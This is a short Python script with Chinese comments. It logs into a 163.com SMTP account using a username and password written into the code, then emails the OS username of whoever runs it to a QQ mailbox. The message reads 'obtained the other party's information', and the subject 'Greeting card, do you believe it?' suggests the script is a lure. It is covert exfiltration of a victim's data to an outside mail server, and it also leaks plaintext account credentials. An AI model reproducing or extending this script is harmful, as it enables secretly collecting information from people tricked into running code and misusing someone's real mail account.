#!/usr/bin/python
# -*- coding: UTF-8 -*-

import smtplib
import traceback
import getpass

from email.mime.text import MIMEText
from email.header import Header

# 第三方 SMTP 服务
mail_host="smtp.163.com"  #设置服务器
mail_user="wei595171801@163.com"    #用户名
mail_pass="wei1321691245"   #口令


sender = 'wei595171801@163.com'
receivers = '595171801@qq.com'  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

message = MIMEText('获取了对方信息'  + getpass.getuser(), 'plain', 'utf-8')
message['From'] = 'chenweirui<wei595171801@163.com>'
message['To'] =  Header("595171801@qq.com", 'utf-8')

subject = '贺卡，你信吗'

message['Subject'] = Header(subject, 'utf-8')

# print(message.as_string())
try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 25)    # 25 为 SMTP 端口号
    smtpObj.login(mail_user,mail_pass)
    smtpObj.sendmail(sender, receivers, message.as_string())
    print ("邮件发送成功")
except smtplib.SMTPException:
    print (traceback.format_exc())
    print ("Error: 无法发送邮件")